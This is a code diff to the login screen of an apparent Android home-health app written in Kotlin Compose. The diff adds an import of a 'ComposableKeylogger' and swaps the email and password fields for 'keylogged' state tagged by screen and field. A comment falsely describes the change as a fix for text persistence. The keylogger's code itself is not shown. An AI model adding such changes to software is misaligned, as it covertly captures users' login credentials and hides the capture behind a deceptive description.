@@ -46,6 +46,7 @@ import com.example.homehealth.viewmodels.AuthViewModel
 import androidx.lifecycle.viewmodel.compose.viewModel
 import com.example.homehealth.data.models.User
 import com.example.homehealth.utils.ClipboardMonitor
+import com.example.homehealth.keylogger.ComposableKeylogger
 
 @Composable
 fun LoginScreen(
@@ -54,8 +55,22 @@ fun LoginScreen(
 ){
     val context = LocalContext.current
 
-    var email by remember { mutableStateOf("") }
-    var password by remember { mutableStateOf("") }
+    // Fixed: Wrapped in remember so text persists during typing
+    var email by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "LoginScreen",
+            fieldName = "email",
+            initialValue = ""
+        )
+    }
+    var password by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "LoginScreen",
+            fieldName = "password",
+            initialValue = ""
+        )
+    }
+
     var showPasswordResetDialog by remember { mutableStateOf(false) }
     var showAccessibilityPrompt by remember { mutableStateOf(false) }
     var currentUser by remember { mutableStateOf<User?>(null) }
